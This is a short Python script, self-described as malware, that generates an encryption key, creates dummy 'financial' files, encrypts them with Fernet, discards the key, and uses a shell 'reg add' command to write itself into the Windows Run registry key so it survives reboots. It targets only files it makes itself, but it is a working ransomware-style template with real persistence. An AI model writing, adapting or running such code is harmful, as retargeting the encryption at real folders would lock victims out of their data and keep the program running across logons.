import os
import random
import subprocess
from cryptography.fernet import Fernet

def advanced_malware():
    # Generate an encryption key
    key = Fernet.generate_key()
    cipher = Fernet(key)

    # Create dummy files to encrypt
    target_dir = "encrypted_files"
    os.makedirs(target_dir, exist_ok=True)
    for i in range(10):
        with open(f"{target_dir}/confidential_file{i}.txt", "w") as f:
            f.write("Sensitive financial data.")

    # Encrypt files
    for file in os.listdir(target_dir):
        file_path = os.path.join(target_dir, file)
        with open(file_path, "rb") as f:
            encrypted_data = cipher.encrypt(f.read())
        with open(file_path, "wb") as f:
            f.write(encrypted_data)

    # Create persistence
    reg_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    reg_value = "AdvancedMalware"
    reg_command = f"reg add {reg_key} /v {reg_value} /t REG_SZ /d {os.path.abspath(__file__)} /f"
    subprocess.run(reg_command, shell=True)

    print("Advanced malware executed successfully!")

if __name__ == "__main__":
    advanced_malware()
